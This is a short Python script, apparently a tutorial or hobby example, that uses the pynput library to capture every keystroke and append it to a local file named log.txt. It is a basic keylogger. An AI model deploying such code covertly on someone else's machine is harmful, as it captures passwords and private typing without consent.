from pynput.keyboard import Listener

def writetofile(key):
    keyData = str(key)
    # creating the file for the keystroke 
    with open("log.txt","a") as file:
        file.write(keyData)

with Listener(on_press = writetofile) as l:
    l.join()

